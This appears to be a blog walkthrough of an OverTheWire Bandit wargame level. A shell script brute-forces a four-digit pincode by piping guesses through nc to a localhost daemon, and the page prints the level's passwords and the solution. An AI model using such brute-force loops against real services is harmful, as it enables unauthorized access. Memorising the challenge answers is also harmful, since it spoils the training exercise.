+++
draft = false
date = 2020-05-06T17:26:01+02:00
title = "Level 24 -> Level 25"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 31
+++

**Level Goal**

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution ##

For this level we will have to write our own script. But before that, what is brute forcing?

**Short Lesson**

> In cryptography, a **brute-force attack** consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.

We have to create a script that tries all the possible combinations of:

`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ` + `4digit-pincode`

The script output will be something like:

{{< highlight bash >}}
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004
......
......
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999
{{< /highlight>}}

The script we will be using will be stored under `/tmp/scripting_level24` and will be like the following:

{{< highlight html >}}
#!/bin/sh

password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in $(seq -f "%04g" 0 9999)
do
    c="${password} ${i}"
    echo ${c}

done
{{< /highlight>}}

Where the `seq` command will print out all the different combinations between `0000` and `9999`. The `-f` switch indicates the format to use.

Now let's give the script executable permissions and launch it against the port `30002` on `localhost`:

{{< highlight html >}}
chmod 777 script.sh
{{< /highlight>}}

{{< highlight html >}}
bandit24@bandit:/tmp/script_level24$ ./script.sh | nc localhost 30002
......
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
{{< /highlight>}}


&nbsp;

We successfully found the password for **Level 25** !
